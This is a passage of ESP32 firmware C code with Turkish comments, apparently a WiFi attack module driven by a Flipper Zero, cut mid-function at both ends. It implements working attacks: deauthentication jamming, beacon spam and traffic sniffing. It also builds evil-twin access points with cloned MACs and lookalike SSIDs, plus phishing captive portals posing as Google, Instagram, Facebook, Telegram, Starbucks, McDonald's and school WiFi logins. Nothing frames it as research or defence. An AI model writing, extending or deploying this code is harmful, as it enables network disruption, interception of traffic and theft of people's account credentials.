            } else if(memcmp(g_aps[i].bssid, addr3, 6) == 0) {
                add_client_to_ap(&g_aps[i], addr1, true);
                add_client_to_ap(&g_aps[i], addr2, true);
                break;
            }
        }
    }

    // Sadece Beacon frame'leri işle ve network listesini genişlet (0x80)
    if(type != WIFI_PKT_MGMT) return;
    if((payload[0] & 0xFC) != 0x80) return;

    // Beacon payload geçerlilik kontrolü
    if(len < 38) return;

    uint8_t* bssid = payload + 16;

    // Zaten kayıtlı mı kontrol et
    for(int i = 0; i < g_ap_count; i++) {
        if(memcmp(g_aps[i].bssid, bssid, 6) == 0) return;
    }

    if(g_ap_count >= MAX_APS) return;

    // SSID uzunluğunu oku ve sınır kontrolü yap
    int ssid_len = payload[37];
    if(ssid_len > 32) ssid_len = 32;
    // Paket uzunluğu SSID datasını içerecek kadar büyük mü?
    if((int)pkt->rx_ctrl.sig_len < 38 + ssid_len) return;

    // AP bilgilerini kaydet
    APRecord* ap = &g_aps[g_ap_count];
    memcpy(ap->bssid, bssid, 6);
    ap->channel = pkt->rx_ctrl.channel;
    ap->rssi    = pkt->rx_ctrl.rssi;

    // SSID oku (payload[36]=SSID tag, payload[37]=SSID len, payload[38+]=SSID)
    if(ssid_len > 0) {
        memcpy(ap->ssid, payload + 38, ssid_len);
    }
    ap->ssid[ssid_len] = '\0';

    g_ap_count++;

    // Flipper'a bildir — yapısal format (Flipper ayrıştırır)
    tx("AP:%d,%02X:%02X:%02X:%02X:%02X:%02X,%s,%d,%d",
       g_ap_count - 1,
       ap->bssid[0], ap->bssid[1], ap->bssid[2],
       ap->bssid[3], ap->bssid[4], ap->bssid[5],
       ap->ssid, ap->channel, ap->rssi);
    tx("STATUS:SCANNING|Found:%d APs", g_ap_count);
}

// ─── Tarama Başlat/Durdur ─────────────────────────────────────
static void start_scan(void) {
    g_ap_count = 0;
    // Promiscuous modu aç ve callback ayarla
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(promiscuous_cb);
    // Kanal 1'den başla
    g_current_ch  = 1;
    g_last_hop    = millis();
    g_last_status = millis();
    tx("STATUS:SCANNING|Found:0 APs");
}

static void stop_all(void) {
    if (g_mode == MODE_SCAN) {
        // Cihazın altında Client'lar varsa onları da ayrı satırda Flipper'a besle
        for(int i = 0; i < g_ap_count; i++) {
            if(g_aps[i].client_count > 0) {
                String cli_str = "CLI:" + String(i) + "," + String(g_aps[i].client_count);
                for(int c = 0; c < g_aps[i].client_count; c++) {
                    char mac_hex[13];
                    snprintf(mac_hex, sizeof(mac_hex), "%02X%02X%02X%02X%02X%02X", 
                        g_aps[i].clients[c].mac[0], g_aps[i].clients[c].mac[1], g_aps[i].clients[c].mac[2],
                        g_aps[i].clients[c].mac[3], g_aps[i].clients[c].mac[4], g_aps[i].clients[c].mac[5]);
                    cli_str += "," + String(mac_hex);
                }
                tx("%s", cli_str.c_str());
                delay(10);
            }
        }
    }

    esp_wifi_set_promiscuous(false);
    
    // Captive Portal aktifse durdur
    if(g_portal_active) {
        stop_captive_portal();
    }
    
    g_running = false;
    g_mode    = MODE_IDLE;
    tx("STATUS:IDLE|Stopped.");
}

// ─── Jam Modunu Başlat ────────────────────────────────────────
static void start_wifi_jam(void) {
    // Jam için de promiscuous mod açık olmalı (raw TX şartı)
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(NULL); // Jam sırasında capture yok
    g_deauth_count = 0;
    g_tx_ok_count  = 0;
    g_tx_err_count = 0;
    g_current_ch   = 1;
    g_last_hop     = millis();
    g_last_status  = millis();
    tx("STATUS:WIFI_JAM|Deauth:0 CH:1");
}

// ─── Beacon Spam Modunu Başlat ────────────────────────────────
static void start_beacon_spam(void) {
    // Beacon için de promiscuous mod açık olmalı
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(NULL);
    g_beacon_count = 0;
    g_beacon_idx   = 0;
    g_current_ch   = 1;
    g_last_hop     = millis();
    g_last_status  = millis();
    tx("STATUS:BEACON_SPAM|Count:0");
}

// ─── Komut Ayrıştırma ────────────────────────────────────────
static void parse_and_execute(const char* cmd) {
    if(strncmp(cmd, "CMD:STOP", 8) == 0) {
        stop_all();

    } else if(strncmp(cmd, "CMD:SCAN", 8) == 0) {
        // Format: CMD:SCAN  veya  CMD:SCAN,TYPE:N
        unsigned int stype = 0;
        if(strlen(cmd) > 8) {
            sscanf(cmd + 8, ",TYPE:%u", &stype);
        }
        g_scan_type = (uint8_t)(stype > 1 ? 1 : stype);
        if(g_running) stop_all();
        g_mode    = MODE_SCAN;
        g_running = true;
        start_scan();
        tx("LOG:Scan started (type=%d)", g_scan_type);

    } else if(strncmp(cmd, "CMD:CJAM", 8) == 0) {
        // Format: CMD:CJAM,AGR:N,HOP:N,SSID:N,MSG:N,PORTAL:N
        // Complete Jam = Deauth + Beacon Spam + (opsiyonel) Captive Portal
        unsigned int agr = 0, hop = 0, ssid = 0, msg = 0, portal = 0;
        sscanf(cmd + 8, ",AGR:%u,HOP:%u,SSID:%u,MSG:%u,PORTAL:%u", &agr, &hop, &ssid, &msg, &portal);
        g_aggression  = (uint8_t)(agr > 2 ? 2 : agr);
        g_hop_speed   = (uint8_t)(hop > 2 ? 2 : hop);
        
        // SSID listesi belirleme: Flipper Name Type'dan gelen (0=Random, 1=Custom, 2=Top20)
        g_beacon_type = (uint8_t)(ssid > 2 ? 0 : ssid);
        if(g_beacon_type == 1 && g_custom_ssid_count == 0) {
            g_beacon_type = 2; // Custom boşsa Top20 fallback
            tx("LOG:No custom SSIDs loaded, using Top20 fallback");
        }
        
        if(g_running) stop_all();
        g_mode    = MODE_COMPLETE_JAM;
        g_running = true;
        esp_wifi_set_promiscuous(true); // Promiscuous mod kapatılmaz!
        esp_wifi_set_promiscuous_rx_cb(promiscuous_cb); // İstemcileri bulması ŞART!
        g_deauth_count = 0;
        g_beacon_count = 0;
        g_beacon_idx   = 0;
        g_tx_ok_count  = 0;
        g_tx_err_count = 0;
        g_current_ch   = 1;
        g_last_hop     = millis();
        g_last_status  = millis();
        tx("STATUS:COMPLETE_JAM|Starting...");
        
        // Portal modu aktifse captive portal başlat
        if(portal > 0) {
            // Portal SSID'si: portal mesaj tipine göre otomatik seç
            const char* portal_names[] = {
                "System_Update", "Free_WiFi", "Network_Service", "WiFi_Login"
            };
            uint8_t pt = (uint8_t)(msg > 3 ? 0 : msg);
            start_captive_portal(portal_names[pt], pt);
        }

    } else if(strncmp(cmd, "CMD:LDEAUTH", 11) == 0) {
        // Format: CMD:LDEAUTH,AGR:N,SEL:0,3,5
        // Sadece seçili AP'lere deauth gönder
        unsigned int agr = 0;
        const char* agr_ptr = strstr(cmd, "AGR:");
        if(agr_ptr) sscanf(agr_ptr, "AGR:%u", &agr);
        g_aggression = (uint8_t)(agr > 2 ? 2 : agr);

        // Önce tüm AP'lerin selected flag'ini temizle
        for(int i = 0; i < g_ap_count; i++) {
            g_aps[i].selected = false;
        }

        // SEL: parametresinden seçili indeksleri oku
        const char* sel_ptr = strstr(cmd, "SEL:");
        int sel_count = 0;
        if(sel_ptr) {
            sel_ptr += 4; // "SEL:" atla
            while(*sel_ptr) {
                int idx = atoi(sel_ptr);
                if(idx >= 0 && idx < g_ap_count) {
                    g_aps[idx].selected = true;
                    sel_count++;
                }
                // Sonraki virgüle atla
                while(*sel_ptr && *sel_ptr != ',') sel_ptr++;
                if(*sel_ptr == ',') sel_ptr++;
            }
        }

        if(sel_count == 0) {
            tx("LOG:No targets selected!");
            return;
        }

        if(g_running) stop_all();
        g_mode    = MODE_LISTED_DEAUTH;
        g_running = true;
        esp_wifi_set_promiscuous(true); // Promiscuous açık olsun (PCAP vb sebeple) ama callback NULL
        esp_wifi_set_promiscuous_rx_cb(NULL);
        g_deauth_count = 0;
        g_tx_ok_count  = 0;
        g_tx_err_count = 0;
        g_current_ch   = 1;
        g_last_hop     = millis();
        g_last_status  = millis();
        tx("STATUS:LISTED_DEAUTH|Targets:%d", sel_count);

    } else if(strncmp(cmd, "CMD:SCLI", 8) == 0) {
        // Format: CMD:SCLI,<AP_ID>,<CLI_ID>,<CLI_ID>...
        // Flipper "Şu AP'nin sadece şu cihazlarını vur" dedi
        int ap_id = -1;
        sscanf(cmd + 9, "%d", &ap_id);
        if(ap_id >= 0 && ap_id < g_ap_count) {
            // Önce AP'nin tüm cihazlarını de-select (false) yap
            for(int c=0; c < g_aps[ap_id].client_count; c++) {
                g_aps[ap_id].clients[c].selected = false;
            }
            // Gelen virgül ile ayrılmış listeyi parse et
            const char* ptr = strchr(cmd + 9, ',');
            while(ptr) {
                ptr++; // virgülü atla
                int c_id = atoi(ptr);
                if(c_id >= 0 && c_id < g_aps[ap_id].client_count) {
                    g_aps[ap_id].clients[c_id].selected = true;
                }
                ptr = strchr(ptr, ','); // sonraki virgüle
            }
            tx("LOG:Set CLI rules for AP %d", ap_id);
        }

    } else if(strncmp(cmd, "CMD:CSSID", 9) == 0) {
        // Format: CMD:CSSID,SSID1\tSSID2\tSSID3...
        // Flipper'dan gelen custom SSID listesi (tab ile ayrılmış)
        g_custom_ssid_count = 0;
        const char* ptr = cmd + 10; // "," atla
        while(*ptr && g_custom_ssid_count < MAX_CUSTOM_SSIDS) {
            int i = 0;
            while(*ptr && *ptr != '\t' && i < PORTAL_SSID_MAX - 1) {
                g_custom_ssids[g_custom_ssid_count][i++] = *ptr++;
            }
            g_custom_ssids[g_custom_ssid_count][i] = '\0';
            if(i > 0) g_custom_ssid_count++;
            if(*ptr == '\t') ptr++;
        }
        tx("LOG:Loaded %d custom SSIDs", g_custom_ssid_count);
        for(int i = 0; i < g_custom_ssid_count; i++) {
            tx("LOG:CSSID[%d]=%s", i, g_custom_ssids[i]);
        }

    } else if(strncmp(cmd, "CMD:PORTAL", 10) == 0) {
        // Format: CMD:PORTAL,SSID:name,PAGE:N
        // Standalone Captive Portal (beacon spam olmadan)
        char p_ssid[33] = "Free_WiFi";
        unsigned int p_page = 0;
        const char* ssid_ptr = strstr(cmd, "SSID:");
        if(ssid_ptr) {
            ssid_ptr += 5;
            int i = 0;
            while(*ssid_ptr && *ssid_ptr != ',' && i < 32) {
                p_ssid[i++] = *ssid_ptr++;
            }
            p_ssid[i] = '\0';
        }
        const char* page_ptr = strstr(cmd, "PAGE:");
        if(page_ptr) sscanf(page_ptr, "PAGE:%u", &p_page);

        if(g_running) stop_all();
        g_mode    = MODE_CAPTIVE_PORTAL;
        g_running = true;
        start_captive_portal(p_ssid, (uint8_t)(p_page > 3 ? 0 : p_page));

    } else if(strncmp(cmd, "CMD:WJ", 6) == 0) {
        // Format: CMD:WJ,AGR:N,HOP:N
        unsigned int agr = 0, hop = 0;
        sscanf(cmd + 6, ",AGR:%u,HOP:%u", &agr, &hop);
        g_aggression = (uint8_t)(agr > 2 ? 2 : agr);
        g_hop_speed  = (uint8_t)(hop > 2 ? 2 : hop);
        if(g_running) stop_all();
        g_mode    = MODE_WIFI_JAM;
        g_running = true;
        start_wifi_jam();

    } else if(strncmp(cmd, "CMD:BSPAM", 9) == 0) {
        // Format: CMD:BSPAM,TYPE:N,PORTAL:N,MSG:N
        // TYPE: 0=Random, 1=Custom, 2=Top20
        unsigned int type = 0, portal = 0, msg = 0;
        sscanf(cmd + 9, ",TYPE:%u", &type);
        g_beacon_type = (uint8_t)(type > 2 ? 0 : type); // >2 → Random fallback
        
        // Portal parametreleri
        const char* portal_ptr = strstr(cmd, "PORTAL:");
        if(portal_ptr) sscanf(portal_ptr, "PORTAL:%u", &portal);
        const char* msg_ptr = strstr(cmd, "MSG:");
        if(msg_ptr) sscanf(msg_ptr, "MSG:%u", &msg);
        
        if(g_running) stop_all();
        g_mode    = MODE_BEACON_SPAM;
        g_running = true;
        g_beacon_count = 0;
        g_beacon_idx   = 0;
        g_current_ch   = 1;
        g_last_hop     = millis();
        g_last_status  = millis();

        // Portal modunu beacon spam ile başlat
        if(portal > 0) {
            const char* portal_names[] = {
                "System_Update", "Free_WiFi", "Network_Service", "WiFi_Login"
            };
            uint8_t pt = (uint8_t)(msg > 3 ? 0 : msg);
            g_portal_channel = 6;
            start_captive_portal(portal_names[pt], pt);
        } else {
            start_beacon_spam();
        }
        tx("STATUS:BEACON_SPAM|Starting...");

    } else if(strncmp(cmd, "CMD:REBOOT", 10) == 0) {
        tx("STATUS:IDLE|Rebooting...");
        delay(200);
        esp_restart();

    // ── CMD:SNIFF — Hedef ağa bağlan + tüm trafik snifle ─────
    } else if(strncmp(cmd, "CMD:SNIFF", 9) == 0 && cmd[9] != 'F') {
        // Format: CMD:SNIFF,SSID:<ssid>,PASS:<pass>
        memset(g_sniff_ssid, 0, sizeof(g_sniff_ssid));
        memset(g_sniff_pass, 0, sizeof(g_sniff_pass));
        const char* ssid_ptr2 = strstr(cmd, "SSID:");
        if(ssid_ptr2) {
            ssid_ptr2 += 5;
            int i = 0;
            while(*ssid_ptr2 && *ssid_ptr2 != ',' && i < 32) g_sniff_ssid[i++] = *ssid_ptr2++;
        }
        const char* pass_ptr2 = strstr(cmd, "PASS:");
        if(pass_ptr2) {
            pass_ptr2 += 5;
            int i = 0;
            while(*pass_ptr2 && *pass_ptr2 != ',' && i < 63) g_sniff_pass[i++] = *pass_ptr2++;
        }
        if(g_running) stop_all();
        g_mode = MODE_SNIFF;
        g_running = true;
        g_sniff_pkt_count = 0;
        g_sniff_connected = false;
        g_target_mac_active = false;
        // Ağa bağlan (şifre boşsa open ağ)
        WiFi.mode(WIFI_STA);
        WiFi.disconnect();
        delay(100);
        if(strlen(g_sniff_pass) > 0) {
            WiFi.begin(g_sniff_ssid, g_sniff_pass);
        } else {
            WiFi.begin(g_sniff_ssid);
        }
        tx("STATUS:SNIFF|Connecting to %s...", g_sniff_ssid);
        g_last_status = millis();

    // ── CMD:TSNIFF — Hedef ağa bağlan + belirli MAC'i snifle ─
    } else if(strncmp(cmd, "CMD:TSNIFF", 10) == 0) {
        // Format: CMD:TSNIFF,SSID:<ssid>,PASS:<pass>,MAC:XX:XX:XX:XX:XX:XX
        memset(g_sniff_ssid, 0, sizeof(g_sniff_ssid));
        memset(g_sniff_pass, 0, sizeof(g_sniff_pass));
        memset(g_target_mac, 0, sizeof(g_target_mac));
        g_target_mac_active = false;
        const char* ssid_ptr3 = strstr(cmd, "SSID:");
        if(ssid_ptr3) {
            ssid_ptr3 += 5;
            int i = 0;
            while(*ssid_ptr3 && *ssid_ptr3 != ',' && i < 32) g_sniff_ssid[i++] = *ssid_ptr3++;
        }
        const char* pass_ptr3 = strstr(cmd, "PASS:");
        if(pass_ptr3) {
            pass_ptr3 += 5;
            int i = 0;
            while(*pass_ptr3 && *pass_ptr3 != ',' && i < 63) g_sniff_pass[i++] = *pass_ptr3++;
        }
        const char* mac_ptr = strstr(cmd, "MAC:");
        if(mac_ptr) {
            mac_ptr += 4;
            unsigned int m[6] = {0};
            if(sscanf(mac_ptr, "%02X:%02X:%02X:%02X:%02X:%02X",
                      &m[0], &m[1], &m[2], &m[3], &m[4], &m[5]) == 6) {
                for(int i = 0; i < 6; i++) g_target_mac[i] = (uint8_t)m[i];
                g_target_mac_active = true;
            }
        }
        if(g_running) stop_all();
        g_mode = MODE_TARGET_SNIFF;
        g_running = true;
        g_sniff_pkt_count = 0;
        g_sniff_connected = false;
        WiFi.mode(WIFI_STA);
        WiFi.disconnect();
        delay(100);
        if(strlen(g_sniff_pass) > 0) {
            WiFi.begin(g_sniff_ssid, g_sniff_pass);
        } else {
            WiFi.begin(g_sniff_ssid);
        }
        tx("STATUS:TARGET_SNIFF|Connecting to %s MAC filter: %s",
           g_sniff_ssid, g_target_mac_active ? "ON" : "OFF");
        g_last_status = millis();

    // ── CMD:EVILTWIN — Evil Twin saldırısı ───────────────────
    } else if(strncmp(cmd, "CMD:EVILTWIN", 12) == 0) {
        // Format: CMD:EVILTWIN,SSID:<ssid>,CH:<n>,BSSID:XX:XX:XX:XX:XX:XX,CLONE:N
        memset(g_evil_ssid, 0, sizeof(g_evil_ssid));
        memset(g_evil_bssid, 0, sizeof(g_evil_bssid));
        g_evil_channel = 6;
        g_clone_mac = false;
        const char* ssid_et = strstr(cmd, "SSID:");
        if(ssid_et) {
            ssid_et += 5;
            int i = 0;
            while(*ssid_et && *ssid_et != ',' && i < 32) g_evil_ssid[i++] = *ssid_et++;
        }
        const char* ch_et = strstr(cmd, "CH:");
        if(ch_et) sscanf(ch_et, "CH:%hhu", &g_evil_channel);
        const char* bssid_et = strstr(cmd, "BSSID:");
        if(bssid_et) {
            bssid_et += 6;
            unsigned int m[6] = {0};
            if(sscanf(bssid_et, "%02X:%02X:%02X:%02X:%02X:%02X",
                      &m[0],&m[1],&m[2],&m[3],&m[4],&m[5]) == 6) {
                for(int i = 0; i < 6; i++) g_evil_bssid[i] = (uint8_t)m[i];
            }
        }
        const char* clone_et = strstr(cmd, "CLONE:");
        if(clone_et) { unsigned int cv = 0; sscanf(clone_et, "CLONE:%u", &cv); g_clone_mac = (cv == 1); }
        if(g_running) stop_all();
        g_mode = MODE_EVIL_TWIN;
        g_running = true;
        g_deauth_count = 0;
        g_tx_ok_count = g_tx_err_count = 0;
        g_last_hop = g_last_status = millis();
        // MAC klonlama
        if(g_clone_mac && (g_evil_bssid[0] | g_evil_bssid[1] | g_evil_bssid[2] | g_evil_bssid[3] | g_evil_bssid[4] | g_evil_bssid[5])) {
            esp_wifi_set_mac(WIFI_IF_AP, g_evil_bssid);
            tx("LOG:MAC cloned to target BSSID");
        } else {
            // CLONE=No: Fabrika MAC'e dön (bir önceki oturumdan kalan klonu temizle)
            esp_wifi_set_mac(WIFI_IF_AP, g_factory_ap_mac);
        }
        g_portal_channel = g_evil_channel; // Evil Twin: portal kanalı = hedef kanalı (aynı ağ gibi görünmeli)
        start_captive_portal(g_evil_ssid, 0); // EVILTWIN sayfası döner
        // NOT: promiscuous(true) ÇAĞRILMIYOR — portal'ı öldürür!
        // esp_wifi_80211_tx deauth için promiscuous açık olmak zorunda değil; loop'da WIFI_IF_AP üzerinden gönderiyoruz.
        tx("STATUS:EVIL_TWIN|Starting SSID:%s CH:%d Clone:%s",
           g_evil_ssid, g_evil_channel, g_clone_mac ? "YES" : "NO");

    // ── CMD:GLOGIN — Public Google Login Beacon Portal ────────
    } else if(strncmp(cmd, "CMD:GLOGIN", 10) == 0) {
        // Format: CMD:GLOGIN,SSID:<ssid>
        memset(g_evil_ssid, 0, sizeof(g_evil_ssid));
        const char* ssid_gl = strstr(cmd, "SSID:");
        if(ssid_gl) {
            ssid_gl += 5;
            int i = 0;
            while(*ssid_gl && *ssid_gl != ',' && i < 32) g_evil_ssid[i++] = *ssid_gl++;
        }
        if(strlen(g_evil_ssid) == 0) snprintf(g_evil_ssid, sizeof(g_evil_ssid), "Free_WiFi");
        if(g_running) stop_all();
        g_mode = MODE_G_LOGIN;
        g_running = true;
        g_last_status = millis();
        g_portal_channel = 6;
        start_captive_portal(g_evil_ssid, 0); // portal_get_current_page GLOGIN sayfası döndürür
        tx("STATUS:G_LOGIN|Starting SSID:%s", g_evil_ssid);

    // ── CMD:TGLOGIN — Targeted Google Login (Evil Twin + G-Login) ─
    } else if(strncmp(cmd, "CMD:TGLOGIN", 11) == 0) {
        // Format: CMD:TGLOGIN,SSID:<ssid>,CH:<n>,BSSID:XX:XX:XX:XX:XX:XX,CLONE:N
        memset(g_evil_ssid, 0, sizeof(g_evil_ssid));
        memset(g_evil_bssid, 0, sizeof(g_evil_bssid));
        g_evil_channel = 6;
        g_clone_mac = false;
        const char* ssid_tgl = strstr(cmd, "SSID:");
        if(ssid_tgl) {
            ssid_tgl += 5;
            int i = 0;
            while(*ssid_tgl && *ssid_tgl != ',' && i < 32) g_evil_ssid[i++] = *ssid_tgl++;
        }
        const char* ch_tgl = strstr(cmd, "CH:");
        if(ch_tgl) sscanf(ch_tgl, "CH:%hhu", &g_evil_channel);
        const char* bssid_tgl = strstr(cmd, "BSSID:");
        if(bssid_tgl) {
            bssid_tgl += 6;
            unsigned int m[6] = {0};
            if(sscanf(bssid_tgl, "%02X:%02X:%02X:%02X:%02X:%02X",
                      &m[0],&m[1],&m[2],&m[3],&m[4],&m[5]) == 6) {
                for(int i = 0; i < 6; i++) g_evil_bssid[i] = (uint8_t)m[i];
            }
        }
        const char* clone_tgl = strstr(cmd, "CLONE:");
        if(clone_tgl) { unsigned int cv = 0; sscanf(clone_tgl, "CLONE:%u", &cv); g_clone_mac = (cv == 1); }
        // SUFFIX:1 → Lookalike modu (SSID'ye '.' ekler)
        const char* suffix_tgl = strstr(cmd, "SUFFIX:");
        g_ssid_lookalike = false;
        if(suffix_tgl) { unsigned int sv = 0; sscanf(suffix_tgl, "SUFFIX:%u", &sv); g_ssid_lookalike = (sv == 1); }

        if(g_running) stop_all();
        g_mode = MODE_TARGET_G_LOGIN;
        g_running = true;
        g_deauth_count = 0;
        g_tx_ok_count = g_tx_err_count = 0;
        g_last_hop = g_last_status = millis();
        if(g_clone_mac && (g_evil_bssid[0] | g_evil_bssid[1] | g_evil_bssid[2] | g_evil_bssid[3] | g_evil_bssid[4] | g_evil_bssid[5])) {
            esp_wifi_set_mac(WIFI_IF_AP, g_evil_bssid);
            tx("LOG:MAC cloned to target BSSID");
        } else {
            // CLONE=No: Fabrika MAC'e geri dön
            esp_wifi_set_mac(WIFI_IF_AP, g_factory_ap_mac);
        }
        g_portal_channel = g_evil_channel;

        // Captive portal için kullanılacak gerçek SSID
        char final_ssid[36];
        if(g_ssid_lookalike) {
            snprintf(final_ssid, sizeof(final_ssid), "%s.", g_evil_ssid);
        } else {
            strncpy(final_ssid, g_evil_ssid, sizeof(final_ssid) - 1);
            final_ssid[sizeof(final_ssid)-1] = '\0';
        }

        start_captive_portal(final_ssid, 0); // portal_get_current_page GLOGIN sayfası döndürür
        tx("STATUS:TARGET_GLOGIN|SSID:%s", final_ssid);
        tx("STATUS:TARGET_GLOGIN|SSID:%s CH:%d Clone:%s Mode:%s",
           final_ssid, g_evil_channel,
           g_clone_mac ? "YES" : "NO",
           g_ssid_lookalike ? "Lookalike" : "Clone");


    // ── CMD:IGLOGIN — Instagram Login Beacon Portal ─────────────
    } else if(strncmp(cmd, "CMD:IGLOGIN", 11) == 0) {
        memset(g_evil_ssid, 0, sizeof(g_evil_ssid));
        const char* s = strstr(cmd, "SSID:");
        if(s) { s += 5; int i = 0; while(*s && *s != ',' && i < 32) g_evil_ssid[i++] = *s++; }
        if(strlen(g_evil_ssid) == 0) snprintf(g_evil_ssid, sizeof(g_evil_ssid), "Instagram_WiFi");
        if(g_running) stop_all();
        g_mode = MODE_IG_LOGIN;
        g_running = true;
        g_last_status = millis();
        g_portal_channel = 6;
        start_captive_portal(g_evil_ssid, 0);
        tx("STATUS:IG_LOGIN|Starting SSID:%s", g_evil_ssid);

    // ── CMD:FBLOGIN — Facebook Login Beacon Portal ──────────────
    } else if(strncmp(cmd, "CMD:FBLOGIN", 11) == 0) {
        memset(g_evil_ssid, 0, sizeof(g_evil_ssid));
        const char* s = strstr(cmd, "SSID:");
        if(s) { s += 5; int i = 0; while(*s && *s != ',' && i < 32) g_evil_ssid[i++] = *s++; }
        if(strlen(g_evil_ssid) == 0) snprintf(g_evil_ssid, sizeof(g_evil_ssid), "Facebook_WiFi");
        if(g_running) stop_all();
        g_mode = MODE_FB_LOGIN;
        g_running = true;
        g_last_status = millis();
        g_portal_channel = 6;
        start_captive_portal(g_evil_ssid, 0);
        tx("STATUS:FB_LOGIN|Starting SSID:%s", g_evil_ssid);

    // ── CMD:TGMLOGIN — Telegram Login Beacon Portal ─────────────
    } else if(strncmp(cmd, "CMD:TGMLOGIN", 12) == 0) {
        memset(g_evil_ssid, 0, sizeof(g_evil_ssid));
        const char* s = strstr(cmd, "SSID:");
        if(s) { s += 5; int i = 0; while(*s && *s != ',' && i < 32) g_evil_ssid[i++] = *s++; }
        if(strlen(g_evil_ssid) == 0) snprintf(g_evil_ssid, sizeof(g_evil_ssid), "Telegram_WiFi");
        if(g_running) stop_all();
        g_mode = MODE_TGM_LOGIN;
        g_running = true;
        g_last_status = millis();
        g_portal_channel = 6;
        start_captive_portal(g_evil_ssid, 0);
        tx("STATUS:TGM_LOGIN|Starting SSID:%s", g_evil_ssid);

    // ── CMD:SBLOGIN — Starbucks WiFi Portal ─────────────────────
    } else if(strncmp(cmd, "CMD:SBLOGIN", 11) == 0) {
        memset(g_evil_ssid, 0, sizeof(g_evil_ssid));
        const char* s = strstr(cmd, "SSID:");
        if(s) { s += 5; int i = 0; while(*s && *s != ',' && i < 32) g_evil_ssid[i++] = *s++; }
        if(strlen(g_evil_ssid) == 0) snprintf(g_evil_ssid, sizeof(g_evil_ssid), "Starbucks_WiFi");
        if(g_running) stop_all();
        g_mode = MODE_SB_LOGIN;
        g_running = true;
        g_last_status = millis();
        g_portal_channel = 6;
        start_captive_portal(g_evil_ssid, 0);
        tx("STATUS:SB_LOGIN|Starting SSID:%s", g_evil_ssid);

    // ── CMD:MCLOGIN — McDonald's WiFi Portal ────────────────────
    } else if(strncmp(cmd, "CMD:MCLOGIN", 11) == 0) {
        memset(g_evil_ssid, 0, sizeof(g_evil_ssid));
        const char* s = strstr(cmd, "SSID:");
        if(s) { s += 5; int i = 0; while(*s && *s != ',' && i < 32) g_evil_ssid[i++] = *s++; }
        if(strlen(g_evil_ssid) == 0) snprintf(g_evil_ssid, sizeof(g_evil_ssid), "McDonalds_Free");
        if(g_running) stop_all();
        g_mode = MODE_MC_LOGIN;
        g_running = true;
        g_last_status = millis();
        g_portal_channel = 6;
        start_captive_portal(g_evil_ssid, 0);
        tx("STATUS:MC_LOGIN|Starting SSID:%s", g_evil_ssid);

    // ── CMD:PUBLOGIN — Public WiFi Portal ───────────────────────
    } else if(strncmp(cmd, "CMD:PUBLOGIN", 12) == 0) {
        memset(g_evil_ssid, 0, sizeof(g_evil_ssid));
        const char* s = strstr(cmd, "SSID:");
        if(s) { s += 5; int i = 0; while(*s && *s != ',' && i < 32) g_evil_ssid[i++] = *s++; }
        if(strlen(g_evil_ssid) == 0) snprintf(g_evil_ssid, sizeof(g_evil_ssid), "Free_Public_WiFi");
        if(g_running) stop_all();
        g_mode = MODE_PUB_LOGIN;
        g_running = true;
        g_last_status = millis();
        g_portal_channel = 6;
        start_captive_portal(g_evil_ssid, 0);
        tx("STATUS:PUB_LOGIN|Starting SSID:%s", g_evil_ssid);

    // ── CMD:SCHLOGIN — School Campus WiFi Portal ────────────────
    } else if(strncmp(cmd, "CMD:SCHLOGIN", 12) == 0) {
        memset(g_evil_ssid, 0, sizeof(g_evil_ssid));
        const char* s = strstr(cmd, "SSID:");
        if(s) { s += 5; int i = 0; while(*s && *s != ',' && i < 32) g_evil_ssid[i++] = *s++; }
        if(strlen(g_evil_ssid) == 0) snprintf(g_evil_ssid, sizeof(g_evil_ssid), "School_Guest");
        if(g_running) stop_all();
        g_mode = MODE_SCH_LOGIN;
        g_running = true;
        g_last_status = millis();
        g_portal_channel = 6;
        start_captive_portal(g_evil_ssid, 0);
        tx("STATUS:SCH_LOGIN|Starting SSID:%s", g_evil_ssid);

    // ── Targeted Helper: parse SSID+CH+BSSID, no clone ─────────
    // ── CMD:TIGLOGIN — Target Instagram (deauth + IG portal) ────
    } else if(strncmp(cmd, "CMD:TIGLOGIN", 12) == 0) {
        memset(g_evil_ssid,  0, sizeof(g_evil_ssid));
        memset(g_evil_bssid, 0, sizeof(g_evil_bssid));
        g_evil_channel = 6;
        g_clone_mac = false;
        const char* s = strstr(cmd, "SSID:");
        if(s) { s += 5; int i = 0; while(*s && *s != ',' && i < 32) g_evil_ssid[i++] = *s++; }
        const char* ch = strstr(cmd, "CH:"); if(ch) sscanf(ch, "CH:%hhu", &g_evil_channel);
        const char* bs = strstr(cmd, "BSSID:");
        if(bs) { bs += 6; unsigned int m[6]={0}; if(sscanf(bs,"%02X:%02X:%02X:%02X:%02X:%02X",&m[0],&m[1],&m[2],&m[3],&m[4],&m[5])==6) for(int i=0;i<6;i++) g_evil_bssid[i]=(uint8_t)m[i]; }
        if(g_running) stop_all();
        esp_wifi_set_mac(WIFI_IF_AP, g_factory_ap_mac);
        g_mode = MODE_TARGET_IG_LOGIN;
        g_running = true;
        g_deauth_count = 0;
        g_last_hop = g_last_status = millis();
        g_portal_channel = 6; // Brand SSID on neutral channel; deauth targets g_evil_channel
        start_captive_portal("Instagram WiFi", 0); // Sabit marka SSID — evil twin değil!
        tx("STATUS:TARGET_IGLOGIN|TargetCH:%d Deauth→%02X:%02X Portal:Instagram WiFi",
           g_evil_channel, g_evil_bssid[4], g_evil_bssid[5]);

    // ── CMD:TFBLOGIN — Target Facebook (deauth + FB portal) ─────
    } else if(strncmp(cmd, "CMD:TFBLOGIN", 12) == 0) {
        memset(g_evil_ssid,  0, sizeof(g_evil_ssid));
        memset(g_evil_bssid, 0, sizeof(g_evil_bssid));
        g_evil_channel = 6;
        g_clone_mac = false;
        const char* s = strstr(cmd, "SSID:");
        if(s) { s += 5; int i = 0; while(*s && *s != ',' && i < 32) g_evil_ssid[i++] = *s++; }
        const char* ch = strstr(cmd, "CH:"); if(ch) sscanf(ch, "CH:%hhu", &g_evil_channel);
        const char* bs = strstr(cmd, "BSSID:");
        if(bs) { bs += 6; unsigned int m[6]={0}; if(sscanf(bs,"%02X:%02X:%02X:%02X:%02X:%02X",&m[0],&m[1],&m[2],&m[3],&m[4],&m[5])==6) for(int i=0;i<6;i++) g_evil_bssid[i]=(uint8_t)m[i]; }
        if(g_running) stop_all();
        esp_wifi_set_mac(WIFI_IF_AP, g_factory_ap_mac);
        g_mode = MODE_TARGET_FB_LOGIN;
        g_running = true;
        g_deauth_count = 0;
        g_last_hop = g_last_status = millis();
